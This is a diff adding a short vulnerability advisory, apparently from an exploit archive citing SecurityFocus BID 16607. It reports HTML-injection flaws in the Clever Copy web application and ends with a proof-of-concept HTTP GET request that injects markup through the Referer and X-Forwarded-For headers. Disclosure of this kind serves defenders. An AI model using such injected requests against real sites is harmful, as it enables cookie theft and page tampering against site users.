@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/16607/info
+
+Clever Copy is prone to multiple HTML-injection vulnerabilities. The application fails to properly sanitize user-supplied input before using it in dynamically generated content. 
+
+Attacker-supplied HTML and script code would be executed in the context of the affected website, potentially allowing an attacker to steal cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+
+GET /path//stats/script.php? image=1&javascript=false HTTP/1.0
+Host: host
+Referer: http://www.example.com/path/index.php<HTML>
+X-Forwarded-For: anyIP<HTML>
